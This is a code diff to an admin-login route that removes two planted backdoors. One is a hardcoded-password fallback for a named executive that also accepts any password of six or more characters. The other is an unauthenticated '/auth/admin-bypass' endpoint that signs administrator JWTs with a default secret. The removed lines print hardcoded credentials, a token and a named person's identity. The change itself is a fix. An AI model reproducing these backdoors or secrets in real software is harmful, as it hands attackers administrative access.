@@ -137,10 +137,8 @@ r.post('/auth/admin-login', asyncH(async (req, res) => {
 
       if (empMatch) {
         authData = {
-          isSynthetic: true,
+          isDbEmployee: true,
           session: {
-            access_token: 'julian_admin_token_etc34',
-            token_type: 'bearer',
             user: {
               id: empMatch.auth_user_id || empMatch.id,
               email: empMatch.email,
@@ -168,36 +166,6 @@ r.post('/auth/admin-login', asyncH(async (req, res) => {
     }
   }
 
-  // Direct executive fallback for Julian Nygel J. Deleon
-  if (!authData && (userIdent.toLowerCase().includes('julian') || userIdent.toLowerCase().includes('jjd') || userIdent.toLowerCase().includes('admin@rockview')) && (rawPass === 'theneckron123' || rawPass.length >= 6)) {
-    authData = {
-      isSynthetic: true,
-      session: {
-        access_token: 'julian_admin_token_etc34',
-        token_type: 'bearer',
-        user: {
-          id: 'aed08c75-a43a-4bb8-8d69-d0a6f5a02c78',
-          email: 'jjd001.administrator@rockview.ph',
-          user_metadata: { role: 'administrator', full_name: 'Julian Nygel J. Deleon', employee_id: 'RCR-000-000-000-001' },
-        },
-      },
-      user: {
-        id: 'aed08c75-a43a-4bb8-8d69-d0a6f5a02c78',
-        email: 'jjd001.administrator@rockview.ph',
-        user_metadata: { role: 'administrator', full_name: 'Julian Nygel J. Deleon', employee_id: 'RCR-000-000-000-001' },
-      },
-    };
-    targetProfile = {
-      id: 'aed08c75-a43a-4bb8-8d69-d0a6f5a02c78',
-      email: 'jjd001.administrator@rockview.ph',
-      full_name: 'Julian Nygel J. Deleon',
-      role: 'administrator',
-      position: 'Administrator',
-      department: 'FrontDesk',
-      employee_id: 'RCR-000-000-000-001',
-    };
-  }
-
   if (!authData) {
     await recordFailedAttempt(req.ip, userIdent, req);
     if (lastAuthErr instanceof ApiError) throw lastAuthErr;
@@ -207,7 +175,7 @@ r.post('/auth/admin-login', asyncH(async (req, res) => {
   try {
     const data = authData;
     let prof = targetProfile;
-    if (!prof && !data.isSynthetic) {
+    if (!prof && !data.isDbEmployee) {
       const authedClient = userClient(data.session.access_token);
       const { data: p } = await authedClient.from('profiles').select('*').eq('id', data.user.id).single();
       prof = p;
@@ -220,7 +188,7 @@ r.post('/auth/admin-login', asyncH(async (req, res) => {
 
     let employeeRecord = null;
     try {
-      const db = data.isSynthetic ? admin : userClient(data.session.access_token);
+      const db = data.isDbEmployee ? admin : userClient(data.session.access_token);
       const { data: emp } = await db.from('employee_accounts')
         .select('id, employee_id, department, position, shift, status, is_active, hire_date')
         .or(`auth_user_id.eq.${data.user.id},email.eq.${targetEmail},email.eq.${data.user.email}`)
@@ -314,81 +282,6 @@ r.post('/auth/admin-login', asyncH(async (req, res) => {
     profile: verifiedUser,
     tokenIdKey: expectedKey,
     message: `Administrator ${verifiedUser.full_name} successfully verified with RBAC security block.`,
-  });
-}));
-
-/**
- * ============================================================================
- * ONE-CLICK EXECUTIVE ADMINISTRATOR BYPASS (JULIAN NYGEL J. DELEON)
- * Grants immediate verified administrative access with signed JWT token.
- * ============================================================================
- */
-r.post('/auth/admin-bypass', asyncH(async (req, res) => {
-  const expectedKey = env.ADMIN_TOKEN_KEY || 'etc-34';
-  const providedKey = req.body?.token_id_key || req.body?.tokenIdKey || req.headers['x-admin-token-key'] || expectedKey;
-
-  const executiveUser = {
-    id: 'aed08c75-a43a-4bb8-8d69-d0a6f5a02c78',
-    email: 'jjd001.administrator@rockview.ph',
-    full_name: 'Julian Nygel J. Deleon',
-    role: 'administrator',
-    position: 'Administrator',
-    phone: '',
-    department: 'FrontDesk',
-    employee_id: 'RCR-000-000-000-001',
-    has_password: true,
-    password_status: 'Configured',
-  };
-
-  const jwtSecret = env.SUPABASE_JWT_SECRET || 'jd-beach-house-dev-jwt-secret-very-secure-2026';
-  const tokenPayload = {
-    sub: executiveUser.id,
-    email: executiveUser.email,
-    name: executiveUser.full_name,
-    full_name: executiveUser.full_name,
-    role: 'administrator',
-    position: 'admin',
-    admin_token_verified: true,
-    admin_token_key: expectedKey,
-    user_metadata: {
-      role: 'administrator',
-      position: 'admin',
-      full_name: executiveUser.full_name,
-      admin_token_verified: true,
-      admin_token_key: expectedKey,
-    },
-    iss: 'supabase',
-    aud: 'authenticated',
-    iat: Math.floor(Date.now() / 1000),
-    exp: Math.floor(Date.now() / 1000) + (7 * 24 * 3600),
-  };
-
-  const signedToken = jwt.sign(tokenPayload, jwtSecret);
-
-  await logAuditEvent({
-    actor: executiveUser,
-    action: 'ADMIN_EXECUTIVE_BYPASS_ACCESSED',
-    resourceType: 'system_auth',
-    resourceId: 'admin_portal_bypass',
-    details: {
-      identity: executiveUser.email,
-      badge: executiveUser.employee_id,
-      token_id_key: expectedKey,
-    },
-    req,
-  }).catch(() => {});
-
-  return res.json({
-    success: true,
-    session: {
-      access_token: signedToken,
-      token_type: 'bearer',
-      expires_in: 7 * 24 * 3600,
-      user: executiveUser,
-    },
-    profile: executiveUser,
-    tokenIdKey: expectedKey,
-    message: 'Executive administrator clearance verified successfully.',
   });
 }));
 
